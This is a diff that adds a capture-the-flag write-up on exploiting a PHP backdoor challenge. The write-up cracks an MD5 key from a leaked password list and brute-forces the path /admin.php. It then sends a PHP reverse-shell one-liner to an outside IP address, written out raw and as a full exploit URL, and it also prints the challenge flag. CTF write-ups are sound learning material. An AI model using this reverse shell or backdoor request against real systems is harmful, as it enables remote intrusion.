@@ -115,4 +115,50 @@ else
   die();
 }
 ```
-$hook is the `passthru` function 
+### Analysing the source code 
+
+- $hook is the `passthru` function 
+- we need to find the original string for this md5 hash "b02dc9b178659a6ea480d72c94713469"
+- To execute a command using the backdoor we need to send /?key=S&hint=logic&zip=command
+
+Now we need to find the key. we have the file hint.txt that has some passwords
+
+```
+["password", 123456, 12345678, 1234, "qwerty", 12345, "dragon", "pussy", "baseball", "football", "letmein", "monkey", 696969, "abc123", "mustang", "michael", "shadow", "master", "jennifer", 111111, 2000, "jordan", "superman", "harley", 1234567, "fuckme", "hunter", "fuckyou", "trustno1", "ranger", "buster", "thomas", "tigger", "robert", "soccer", "fuck", "batman", "test", "pass", "killer", "hockey", "george", "charlie", "andrew", "michelle", "love", "sunshine", "jessica", "asshole", 6969, "pepper", "daniel", "access", 123456789, 654321, "joshua", "maggie", "starwars", "silver", "william", "dallas", "3waba1337@!", 123123, "ashley", 666666, "hello", "amanda", "orange", "biteme", "freedom", "computer", "sexy", "thunder", "nicole", "ginger", "heather", "hammer", "summer", "corvette", "taylor", "fucker", "austin", 1111]
+```
+
+After trying the md5 of those passwords i found the one needed
+
+MD5(3waba1337@!) = b02dc9b178659a6ea480d72c94713469
+
+Now the backdoor command is /?key=3waba1337@!&hint=logic&zip=command
+
+Now we need to find the backdoor location, i changed to the diresearch default wordlist and retry bruteforcing
+
+I found the backdoor /admin.php 
+
+Now let's send the full command. I used the php reverse shell (bash didn't work) 
+
+```
+php -r '$sock=fsockopen("18.158.249.75",19145);exec("bash <&3 >&3 2>&3");'
+```
+
+```
+https://thnbdarija-arcade.chals.io/admin.php?key=3waba1337%40%21&hint=logic&zip=php%20-r%20%27%24sock%3Dfsockopen%28%2218.158.249.75%22%2C19145%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+```
+
+I got th reverse shell 
+
+![image](https://user-images.githubusercontent.com/72421091/163742024-53625e1e-2c55-4cdd-be54-036e2ea8ffdf.png)
+
+The box dosent have python so i used script to stablize the shell `/usr/bin/script -qc /bin/bash /dev/null`
+
+Checking the home directory, i found a user called ctf with a file .flag inside his home directory 
+
+![image](https://user-images.githubusercontent.com/72421091/163742333-7341fdd8-cb35-449a-9609-135fe4942ea1.png)
+
+### Flag
+
+```
+thnb{Th4nkS_f0r_s4v1ng_Th3_4rC4d3_M4ch1n3}
+```
